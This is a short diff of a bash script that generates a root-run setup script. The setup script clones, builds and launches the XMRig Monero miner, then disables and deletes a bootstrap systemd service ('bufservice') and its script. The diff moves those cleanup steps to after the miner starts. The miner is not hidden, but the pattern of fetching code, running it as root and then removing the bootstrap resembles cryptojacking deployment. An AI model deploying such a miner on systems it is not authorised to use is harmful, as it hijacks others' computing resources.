@@ -39,10 +39,6 @@ create_SettingXMRMiner(){
 cat <<EOF > /root/SettingXMRMiner.sh
 #!/bin/bash
 
-rm bufscript.sh
-sudo systemctl disable bufservice
-rm /etc/systemd/system/bufservice.service
-
 cd root
 sudo apt-get install -y git build-essential cmake automake libtool autoconf
 git clone https://github.com/xmrig/xmrig.git
@@ -50,8 +46,12 @@ mkdir xmrig/build && cd xmrig/scripts
 ./build_deps.sh && cd ../build
 cmake .. -DXMRIG_DEPS=scripts/deps
 make -j$(nproc)
-mv config.json xmrig/build/
+mv config.json /root/xmrig/build/
 /root/xmrig/build/./xmrig
+
+rm bufscript.sh
+sudo systemctl disable bufservice
+rm /etc/systemd/system/bufservice.service
 
 EOF
 }
